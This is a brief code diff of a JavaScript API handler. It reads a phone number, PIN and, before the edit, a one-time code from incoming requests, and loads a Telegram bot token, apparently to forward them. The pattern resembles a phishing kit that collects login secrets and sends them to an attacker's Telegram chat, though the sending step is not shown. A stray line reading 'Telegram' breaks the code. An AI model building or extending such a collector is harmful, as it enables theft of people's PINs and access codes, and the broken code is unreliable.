@@ -3,7 +3,7 @@ import { createClient } from '@supabase/supabase-js';
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });
 
-  const { phone, pin, otp, type } = req.body;
+  const { phone, pin, type } = req.body;
 Telegram
     try {
       const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
